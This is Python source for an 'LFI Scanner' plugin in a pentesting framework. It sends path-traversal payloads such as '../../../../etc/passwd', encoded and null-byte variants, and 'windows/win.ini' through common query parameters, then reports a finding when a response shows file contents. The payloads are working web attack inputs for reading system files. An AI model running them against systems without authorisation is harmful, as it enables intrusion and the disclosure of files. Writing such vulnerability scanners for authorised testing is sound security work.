"""Local File Inclusion (LFI) detection."""

from __future__ import annotations

from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

LFI_PAYLOADS = [
    ("../../../../etc/passwd", "root:"),
    ("....//....//....//etc/passwd", "root:"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
    ("/etc/passwd%00", "root:"),
    ("../../../../windows/win.ini", "[extensions]"),
    ("..\\..\\..\\..\\windows\\win.ini", "[extensions]"),
]

LFI_PARAMS = ["file", "page", "path", "include", "template", "doc", "folder", "pg", "view"]


class LfiCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="lfi_check",
        display_name="LFI Scanner",
        category=PluginCategory.PENTESTING,
        description="Detects Local File Inclusion vulnerabilities",
        produces=["lfi_findings"],
        timeout=30.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        findings: list[Finding] = []
        tested: list[dict] = []
        base_url = ""

        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.head(f"{scheme}://{target.host}/", timeout=5.0)
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception:
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"lfi_tests": []},
            )

        for param in LFI_PARAMS:
            for payload, indicator in LFI_PAYLOADS:
                url = f"{base_url}/?{param}={payload}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(url, timeout=8.0)
                        body = await resp.text(encoding="utf-8", errors="replace")

                        if indicator in body:
                            tested.append({
                                "param": param, "payload": payload,
                                "indicator": indicator,
                            })
                            findings.append(Finding.critical(
                                f"Local File Inclusion via ?{param}=",
                                description=(
                                    f"Server reads local files with "
                                    f"payload: {payload}"
                                ),
                                evidence=f"Response contains: {indicator}",
                                remediation=(
                                    "Never use user input in file paths. "
                                    "Use a whitelist of allowed files."
                                ),
                                tags=["pentesting", "lfi"],
                            ))
                            break
                except Exception:
                    continue
            if findings:
                break

        if not findings:
            findings.append(Finding.info(
                "No LFI vulnerabilities detected",
                tags=["pentesting", "lfi"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"lfi_tests": tested},
        )
